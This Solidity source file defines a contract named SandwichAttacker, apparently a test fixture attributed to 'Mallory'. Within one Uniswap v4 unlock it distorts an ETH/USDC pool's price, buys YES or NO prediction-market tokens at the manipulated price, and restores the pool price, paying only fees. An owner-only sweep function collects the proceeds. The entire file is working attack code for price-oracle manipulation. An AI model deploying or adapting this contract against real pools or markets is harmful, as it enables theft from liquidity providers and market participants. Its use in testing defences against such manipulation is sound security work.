// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {StateLibrary} from "v4-core/src/libraries/StateLibrary.sol";
import {TransientStateLibrary} from "v4-core/src/libraries/TransientStateLibrary.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {SwapParams} from "v4-core/src/types/PoolOperation.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

/// @notice Mallory's atomic sandwich in ONE PoolManager unlock: push the underlying ETH/USDC pool to `pushTo`, buy
///         YES (or NO) with `usdcIn` USDC, push the pool back to where it started, then settle every delta. Flash
///         accounting nets the two pushes, so only the pool fees have to be paid.
contract SandwichAttacker is IUnlockCallback {
    using StateLibrary for IPoolManager;
    using TransientStateLibrary for IPoolManager;
    using SafeTransferLib for address;

    error OnlyOwner();
    error OnlyPoolManager();

    struct Plan {
        PoolKey underlying;
        uint160 pushTo;
        PoolKey market;
        address usdc;
        uint256 usdcIn;
    }

    /// @dev Exact-in magnitude that always stops at the price limit
    int256 internal constant PUSH_AMOUNT = -int256(uint256(type(uint128).max) >> 8);

    IPoolManager public immutable pm;
    address public immutable owner;

    uint256 public lastOut;
    uint256 public lastIn;
    uint160 public pushedSqrtPrice;

    constructor(IPoolManager pm_, address owner_) {
        pm = pm_;
        owner = owner_;
    }

    function attack(PoolKey calldata underlying, uint160 pushTo, PoolKey calldata market, address usdc, uint256 usdcIn)
        external
    {
        if (msg.sender != owner) revert OnlyOwner();
        pm.unlock(abi.encode(Plan(underlying, pushTo, market, usdc, usdcIn)));
    }

    /// @notice Sends a token balance back to the owner
    function sweep(address token) external returns (uint256 bal) {
        if (msg.sender != owner) revert OnlyOwner();
        bal = token.balanceOf(address(this));
        if (bal != 0) token.safeTransfer(owner, bal);
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        if (msg.sender != address(pm)) revert OnlyPoolManager();
        Plan memory p = abi.decode(data, (Plan));
        (uint160 start,,,) = pm.getSlot0(p.underlying.toId());
        _swapTo(p.underlying, p.pushTo);
        (pushedSqrtPrice,,,) = pm.getSlot0(p.underlying.toId());

        bool zf1 = Currency.unwrap(p.market.currency0) == p.usdc;
        pm.swap(
            p.market,
            SwapParams({
                zeroForOne: zf1,
                amountSpecified: -int256(p.usdcIn),
                sqrtPriceLimitX96: zf1 ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1
            }),
            ""
        );
        Currency outC = zf1 ? p.market.currency1 : p.market.currency0;
        lastOut = uint256(pm.currencyDelta(address(this), outC));
        lastIn = p.usdcIn;

        _swapTo(p.underlying, start);

        _resolve(p.underlying.currency0);
        _resolve(p.underlying.currency1);
        _resolve(p.market.currency0);
        _resolve(p.market.currency1);
        return "";
    }

    function _swapTo(PoolKey memory k, uint160 target) internal {
        (uint160 sp,,,) = pm.getSlot0(k.toId());
        if (sp == target) return;
        pm.swap(k, SwapParams({zeroForOne: target < sp, amountSpecified: PUSH_AMOUNT, sqrtPriceLimitX96: target}), "");
    }

    function _resolve(Currency c) internal {
        int256 d = pm.currencyDelta(address(this), c);
        if (d < 0) {
            pm.sync(c);
            Currency.unwrap(c).safeTransfer(address(pm), uint256(-d));
            pm.settle();
        } else if (d > 0) {
            pm.take(c, address(this), uint256(d));
        }
    }
}
